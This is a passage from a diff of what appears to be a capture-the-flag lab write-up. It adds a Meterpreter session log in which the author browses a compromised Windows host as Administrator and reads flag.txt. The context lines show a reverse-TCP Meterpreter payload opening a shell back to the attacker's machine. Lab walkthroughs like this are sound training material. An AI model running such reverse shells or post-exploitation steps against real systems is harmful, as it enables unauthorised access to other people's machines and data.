@@ -929,5 +929,78 @@ payload => windows/meterpreter/reverse_tcp
 /usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
 [*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.129.2.141:49673) at 2026-05-27 14:08:12 -0400
 
+(Meterpreter 1)(C:\Windows\system32) > cd ..\..\
+ > 
+ > ..
+(Meterpreter 1)(C:\Windows\system32) > cd ..
+(Meterpreter 1)(C:\Windows) > cd ..
+(Meterpreter 1)(C:\) > cd users
+(Meterpreter 1)(C:\users) > dir
+Listing: C:\users
+=================
 
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040777/rwxrwxrwx  8192  dir   2020-10-05 21:51:20 -0400  .NET v2.0
+040777/rwxrwxrwx  8192  dir   2020-10-05 21:51:19 -0400  .NET v2.0 Classic
+040777/rwxrwxrwx  8192  dir   2020-10-05 21:51:25 -0400  .NET v4.5
+040777/rwxrwxrwx  8192  dir   2020-10-05 21:51:24 -0400  .NET v4.5 Classic
+040777/rwxrwxrwx  8192  dir   2020-10-05 19:18:25 -0400  Administrator
+040777/rwxrwxrwx  0     dir   2016-07-16 09:34:35 -0400  All Users
+040777/rwxrwxrwx  8192  dir   2020-10-05 21:51:18 -0400  Classic .NET AppPool
+040555/r-xr-xr-x  8192  dir   2020-10-02 20:22:46 -0400  Default
+040777/rwxrwxrwx  0     dir   2016-07-16 09:34:35 -0400  Default User
+040555/r-xr-xr-x  4096  dir   2016-11-20 20:24:46 -0500  Public
+100666/rw-rw-rw-  174   fil   2016-07-16 09:21:29 -0400  desktop.ini
+
+(Meterpreter 1)(C:\users) > cd Administrator\
+ > \
+ > 
+(Meterpreter 1)(C:\users\Administrator) > ls
+Listing: C:\users\Administrator
+===============================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  AppData
+040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  Application Data
+040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Contacts
+040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  Cookies
+040555/r-xr-xr-x  0       dir   2022-05-16 08:17:01 -0400  Desktop
+040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Documents
+040555/r-xr-xr-x  0       dir   2020-10-05 22:08:04 -0400  Downloads
+040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Favorites
+040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Links
+040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  Local Settings
+040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Music
+040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  My Documents
+100666/rw-rw-rw-  786432  fil   2022-05-16 09:21:00 -0400  NTUSER.DAT
+100666/rw-rw-rw-  65536   fil   2020-10-05 19:19:25 -0400  NTUSER.DAT{a0d1b9b4-af87-11e6-9658-c2e7ef3e8ee3}.TM.blf
+100666/rw-rw-rw-  524288  fil   2020-10-05 19:19:25 -0400  NTUSER.DAT{a0d1b9b4-af87-11e6-9658-c2e7ef3e8ee3}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288  fil   2020-10-05 19:19:25 -0400  NTUSER.DAT{a0d1b9b4-af87-11e6-9658-c2e7ef3e8ee3}.TMContainer00000000000000000002.regtrans-ms
+040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  NetHood
+040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Pictures
+040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  PrintHood
+040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  Recent
+040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Saved Games
+040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Searches
+040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  SendTo
+040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  Start Menu
+040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  Templates
+040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Videos
+100666/rw-rw-rw-  16384   fil   2020-10-05 19:18:23 -0400  ntuser.dat.LOG1
+100666/rw-rw-rw-  226304  fil   2020-10-05 19:18:23 -0400  ntuser.dat.LOG2
+100666/rw-rw-rw-  20      fil   2020-10-05 19:18:23 -0400  ntuser.ini
+
+(Meterpreter 1)(C:\users\Administrator) > cd Desktop\\
+(Meterpreter 1)(C:\users\Administrator\Desktop) > ls
+Listing: C:\users\Administrator\Desktop
+=======================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  282   fil   2020-10-05 19:18:25 -0400  desktop.ini
+100666/rw-rw-rw-  29    fil   2022-05-16 07:19:21 -0400  flag.txt
+
+(Meterpreter 1)(C:\users\Administrator\Desktop) > cat flag.txt
 ```
